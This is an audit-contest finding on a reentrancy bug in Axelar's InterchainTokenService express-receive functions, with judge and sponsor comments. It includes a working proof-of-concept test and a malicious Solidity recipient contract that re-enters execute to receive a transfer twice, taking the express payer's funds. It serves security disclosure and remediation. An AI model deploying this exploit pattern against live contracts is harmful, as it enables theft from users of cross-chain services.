[H-01]expressReceiveTokencan be abused using reentry
Submitted byimmeas, also found bynobody2018
A token transfer can be express delivered on behalf of another user when the call contains data to be executed:
https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L467-L487
File:its/interchain-token-service/InterchainTokenService.sol467:functionexpressReceiveTokenWithData(// ... params475:    )external{476:if(gateway.isCommandExecuted(commandId))revertAlreadyExecuted(commandId);477:478:addresscaller=msg.sender;479:ITokenManagertokenManager=ITokenManager(getValidTokenManagerAddress(tokenId));480:IERC20token=IERC20(tokenManager.tokenAddress());481:482:SafeTokenTransferFrom.safeTransferFrom(token,caller,destinationAddress,amount);483:484:_expressExecuteWithInterchainTokenToken(tokenId,destinationAddress,sourceChain,sourceAddress,data,amount);485:486:_setExpressReceiveTokenWithData(tokenId,sourceChain,sourceAddress,destinationAddress,amount,data,commandId,caller);487:    }
The issue here, is that check effect interactions are not followed.
There are two attack paths here with varying assumptions and originating parties:
Attacker: Anyone, assuming there are third parties providingexpressReceiveTokenWithDataon demand with on-chain call:
An attacker sends a large token transfer to a chain with a public mempool.Once the attacker sees the call by Axelar toAxelarGateway::exectutein the mempool, they front-run this call with a call to the third party providingexpressReceiveTokenWithData.The third party (victim) transfers the tokens to thedestinationAddresscontract. Attacker is now+amountfrom this transfer.expressExecuteWithInterchainTokenon thedestinationAddresscontract does a call toAxelarGateway::exectute(which can be called by anyone) to submit the report and then a reentry call toInterchainTokenService::executetheircommandId. This performs the second transfer from theTokenManagerto thedestinationAddress(since the_setExpressReceiveTokenWithDatahas not yet been called). Attacker contract is now+2x amount, having received both the express transfer and the original transfer._setExpressReceiveTokenWithDatais set, but thiscommandIdhas already been executed. The victims funds have been stolen.
AxelarGateway operator, assuming there are third parties providingexpressReceiveTokenWithDataoff-chain call:
The operator does the same large transfer as described above. The operator then holds the update toAxelarGateway::executeand instead, sends these instructions to their maliciousdestinationContract. When theexpressReceiveTokenWithDatais called, this malicious contract will do the same pattern as described above. CallAxelarGateway::executethenInterchainTokenService::execute.
The same attacks could work for tokens with transfer callbacks (like ERC777) with just theexpressReceiveTokencall, as well.
Impact
With a very large cross chain token transfer, a malicious party can use this to steal the same amount from the express receive executor.
If this fails, since it relies on front-running and some timing, the worst thing that happens for the attacker is that the transfer goes through and they’ve just lost the transfer fees.
Note to judge/sponsor
This makes some assumptions about how trusted an operator/reporter is and that there are possibilities to haveexpressReceiveTokensto be called essentially on demand (”ExpressReceiveAsAService”). If these aren’t valid, please regard this as a low; just noting the failure to follow checks-effects-interactions inexpressReceiveToken/WithData.
The existence ofexpressReceiveimplies though, that there should be some kind of service providing this premium service for a fee.
Proof of Concept
Test intokenService.js:
it('attacker steals funds from express executor',async()=>{const[token,tokenManager,tokenId] =awaitdeployFunctions.lockUnlock(`Test Token Lock Unlock`,'TT',12,amount*2);awaittoken.transfer(tokenManager.address,amount);constexpressPayer= (awaitethers.getSigners())[5];awaittoken.transfer(expressPayer.address,amount);awaittoken.connect(expressPayer).approve(service.address,amount);constcommandId=getRandomBytes32();constrecipient=awaitdeployContract(wallet,'ExpressRecipient',[gateway.address,service.address,service.address.toLowerCase()]);constdata='0x'constpayload=defaultAbiCoder.encode(['uint256','bytes32','bytes','uint256','bytes','bytes'],[SELECTOR_SEND_TOKEN_WITH_DATA,tokenId,recipient.address,amount,service.address,data],);constparams=defaultAbiCoder.encode(['string','string','address','bytes32','bytes32','uint256'],[sourceChain,sourceAddress,service.address,keccak256(payload),getRandomBytes32(),0],);awaitrecipient.setData(params,commandId);// expressPayer express pays triggering the reentrancyawaitservice.connect(expressPayer).expressReceiveTokenWithData(tokenId,sourceChain,service.address,recipient.address,amount,data,commandId,);// recipient has gotten both the cross chain and express transferexpect(awaittoken.balanceOf(recipient.address)).to.equal(amount*2);});
Andits/test/ExpressRecipient.sol:
// SPDX-License-Identifier: MITpragmasolidity^0.8.0;import{MockAxelarGateway}from'./MockAxelarGateway.sol';import{IInterchainTokenExpressExecutable}from'../interfaces/IInterchainTokenExpressExecutable.sol';import{AxelarExecutable}from'../../gmp-sdk/executable/AxelarExecutable.sol';import{AddressBytesUtils}from'../libraries/AddressBytesUtils.sol';contractExpressRecipientisIInterchainTokenExpressExecutable{usingAddressBytesUtilsforaddress;bytesprivateparams;MockAxelarGatewayprivategateway;AxelarExecutableprivateinterchainTokenService;bytes32privatecommandId;stringprivatesourceAddress;constructor(MockAxelarGateway_gateway_,AxelarExecutable_its,stringmemory_sourceAddress) {gateway=_gateway_;interchainTokenService=_its;sourceAddress=_sourceAddress;}functionsetData(bytesmemory_params,bytes32_commandId)public{params=_params;commandId=_commandId;}functionexpressExecuteWithInterchainToken(stringcalldatasourceChain,bytesmemorysadd,bytescalldatadata,bytes32tokenId,uint256amount)public{// this uses the mock call from tests but a real reporter would// have all data needed to make this call the proper waygateway.approveContractCall(params,commandId);bytesmemorypayload=abi.encode(uint256(2),tokenId,address(this).toBytes(),amount,sadd,data);// do the reentrancy and execute the transferinterchainTokenService.execute(commandId,sourceChain,sourceAddress,payload);}functionexecuteWithInterchainToken(stringcalldata,bytescalldata,bytescalldata,bytes32,uint256)public{}}
Recommended Mitigation Steps
Consider using_setExpressReceiveTokenWithDatabefore external calls.
Assessed type
Reentrancy
berndartmueller (judge) commented:
Besides being very difficult to follow and understand, there are many assumptions on trust assumption violations.
deanamiel (Axelar) confirmed and commented:
This vulnerability has been addressed. See PRhere.
berndartmueller (judge) commented:
After a more thorough review, it is evident that theInterchainTokenService.expressReceiveTokenWithData, and, under certain conditions such as the use of ERC-777 tokens,InterchainTokenService.expressReceiveTokenfunctions are vulnerable to reentrancy due to violating the CEI-pattern.Consequently, funds can be stolen by an attacker from actors who attempt to fulfill token transfers ahead of time via the express mechanism. Thus, considering this submission as a valid high-severity finding.Hats off to the wardens who spotted this vulnerability!